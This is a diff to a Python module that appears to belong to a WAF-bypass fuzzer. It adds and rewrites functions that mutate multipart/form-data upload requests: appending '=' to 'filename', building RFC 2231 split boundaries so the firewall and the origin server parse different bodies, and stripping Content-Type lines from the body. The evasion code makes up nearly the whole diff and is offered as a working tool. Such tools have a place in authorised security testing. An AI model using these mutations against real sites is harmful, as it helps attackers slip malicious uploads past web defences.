@@ -1,5 +1,6 @@
 import json
 import random
+import re
 import urllib.parse
 from utils.logUtils import LoggerSingleton
 from utils.dictUtils import content_types
@@ -147,16 +148,30 @@ def mutant_upload_methods_double_equals(headers,url,method,data,files):
     logger.info(TAG + "==>mutant_upload_methods_double_equals")
     logger.debug(TAG + "==>headers: " + str(headers))
     mutant_payloads = []
-    if files:
-        if 'filename' in files:
-            files['filename'] = files['filename'] + "="
+    # 只有 multipart/form-data 才需要可以使用这个方法
+    content_type = headers.get('Content-Type')
+    if content_type and re.match('multipart/form-data', content_type):
+        # 双写等号：如果含有filename，则替换为filename=
+        data_str = data.decode()
+        if 'filename' in data_str:
+            data_str = data_str.replace('filename', 'filename=')
             mutant_payloads.append({
-                'headers': headers,
-                'url': url,
-                'method': method,
-                'data': data,
-                'files': files
-            })
+                        'headers': headers,
+                        'url': url,
+                        'method': method,
+                        'data': data_str
+                    })
+    # if files:
+    #     if 'filename' in files:
+    #         files['filename'] = files['filename'] + "="
+    #         mutant_payloads.append({
+    #             'headers': headers,
+    #             'url': url,
+    #             'method': method,
+    #             'data': data,
+    #             'files': files
+    #         })
+
     return mutant_payloads
 
 def unicode_obfuscate(text):
@@ -277,29 +292,64 @@ def mutant_methods_multipart_boundary(headers, url, method, data, files):
     """ 对 boundary 进行变异进而绕过"""
     logger.info(TAG + "==>mutant_methods_multipart_boundary")
     logger.debug(TAG + "==>headers: " + str(headers))
+    # 只有 multipart/form-data 才需要可以使用这个方法
+    content_type = headers.get('Content-Type')
+    if not content_type or not re.match('multipart/form-data', content_type):
+        return []
 
+    # 解析filename
+    data_str = data.decode()
+    pattern = re.compile(r'Content-Disposition: form-data;.*filename="([^"]+)"')
+    filenames = pattern.findall(data_str)
+
+    # 从Content-Type中解析boundary的正则表达式
+    pattern = re.compile(r'boundary=(.*)')
+    match = pattern.search(content_type)
+    if match:
+        boundary = match.group(1)
+        print(f"Found boundary: {boundary}")
+    else:
+        # 无boundary
+        return []
+
+    # 拼接后为----realBoundary
+    boundary0 = '----real'
+    boundary1 = 'Boundary'
     mutant_payloads = []
-    if 'Content-Type' not in headers or 'boundary' not in headers['Content-Type']:
-        # 如果没有boundary，直接返回
-        return mutant_payloads
     # 基于 RFC 2231 的boundary构造
-    boundary1 = ';boundary*0="-real-"'
-    boundary2 = ';boundary*1="boundary"'
-    headers['Content-Type'] = headers['Content-Type']+boundary1+boundary2
+    content_type += f'; boundary*0={boundary0}; boundary*1={boundary1}'
 
-    old_boundary = headers['Content-Type'].split('boundary')[1]
-    # 第一种是go的解析方式，第二种是flask的解析方式
-    new_boundaries = ["-real-boundary", old_boundary+"-real-boundary"]
-    for new_boundary in new_boundaries:
-        fake_data = data.replace(old_boundary, new_boundary)
-        data += fake_data
-        logger.debug(TAG + "==>data: " + data)
+    # 构造新的header
+    headers.update({'Content-Type': content_type})
+    # 构造请求体，第一种是go的解析方式，第二种是flask的解析方式
+    # waf解析的边界
+    fake_body = f'--{boundary}\r\n'
+    fake_body += f'Content-Disposition: form-data; name="field1"\r\n\r\n'
+    fake_body += f'fake data\r\n'
+    fake_body += f'--{boundary}--\r\n'
+
+    # 真正的源站解析的边界
+    real_body = ['', '']
+    for filename in filenames:
+        real_body[0] += f'--{boundary0}{boundary1}\r\n'
+        real_body[0] += f'Content-Disposition: form-data; name="field2"; filename="{filename}"\r\n'
+        real_body[0] += f'Content-Type: text/plain\r\n\r\n'
+        real_body[0] += f'real data\r\n'
+    real_body[0] += f'--{boundary0}{boundary1}--\r\n'
+
+    for filename in filenames:
+        real_body[1] += f'--{boundary}{boundary0}{boundary1}\r\n'
+        real_body[1] += f'Content-Disposition: form-data; name="field2"; filename="{filename}"\r\n'
+        real_body[1] += f'Content-Type: text/plain\r\n\r\n'
+        real_body[1] += f'real data\r\n'
+    real_body[1] += f'--{boundary}{boundary0}{boundary1}--\r\n'
+
+    for body in real_body:
         mutant_payloads.append({
             'headers': headers,
             'url': url,
             'method': method,
-            'data': data,
-            'files': files
+            'data': data_str+body
         })
     return mutant_payloads
 
@@ -328,6 +378,29 @@ def mutant_methods_add_padding(headers, url, method, data, files):
     })
     return mutant_payloads
 
+
+# 删除data中的Content-Type
+def mutant_methods_delete_content_type_of_data(headers, url, method, data, files):
+    """ 删除data中的Content-Type:xxx; """
+    logger.info(TAG + "==>mutant_methods_delete_content_type_of_data")
+    logger.debug(TAG + "==>headers: " + str(headers))
+    mutant_payloads = []
+    # 只有 multipart/form-data 才需要可以使用这个方法
+    content_type = headers.get('Content-Type')
+    if content_type and re.match('multipart/form-data', content_type):
+        pattern = r'Content-Type:[^;]+;\s*'
+        # 使用re.sub()函数来删除所有匹配的部分
+        data_str = data.decode()
+        cleaned_data = re.sub(pattern, '', data_str)
+        mutant_payloads.append({
+            'headers': headers,
+            'url': url,
+            'method': method,
+            'data': cleaned_data
+        })
+    return mutant_payloads
+
+
 '''
 ALL MUTANT METHODS:
 mutant_methods_modify_content_type
@@ -351,14 +424,16 @@ mutant_methods_config = {
     "mutant_methods_line_breaks": (mutant_methods_line_breaks, True),
     "mutant_methods_add_padding": (mutant_methods_add_padding, True),
     "mutant_methods_multipart_boundary": (mutant_methods_multipart_boundary, True),
-    "mutant_upload_methods_double_equals": (mutant_upload_methods_double_equals, True)
+    "mutant_upload_methods_double_equals": (mutant_upload_methods_double_equals, True),
+    "mutant_methods_delete_content_type_of_data": (mutant_methods_delete_content_type_of_data, True)
 }
 
 # 初始化启用的变异方法
-mutant_methods = [
-    method for method, enabled in mutant_methods_config.values()
-    if enabled
-]
+# mutant_methods = [
+#     method for method, enabled in mutant_methods_config.values()
+#     if enabled
+# ]
+mutant_methods = [mutant_methods_delete_content_type_of_data]
 # 上传载荷变异方法
 mutant_methods_dedicated_to_upload = []
 
